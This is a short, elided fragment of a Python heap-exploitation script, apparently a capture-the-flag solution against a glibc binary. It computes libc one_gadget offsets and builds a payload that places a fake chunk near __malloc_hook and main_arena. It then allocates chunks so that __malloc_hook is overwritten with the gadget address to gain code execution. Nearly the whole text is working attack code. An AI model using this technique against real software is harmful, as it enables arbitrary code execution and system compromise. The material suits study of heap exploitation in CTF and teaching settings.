...
libc_one_gadget = [0xf1147, 0xf02a4, 0x4526a][0]
...
while True:
    ...
    payload = b'\x00' * 6
    payload += b'\x00' * 0x30
    payload += p64(libc_base + libc.symbol("__malloc_hook") - 0x10)
    payload += p64(libc_base + libc_main_arena + 0x58)
    add(0x58, payload) # 14
    add(0x48, p64(libc_base + libc_one_gadget)) # 16 == top chunk
    logger.info("one gadget = " + hex(libc_base + libc_one_gadget))
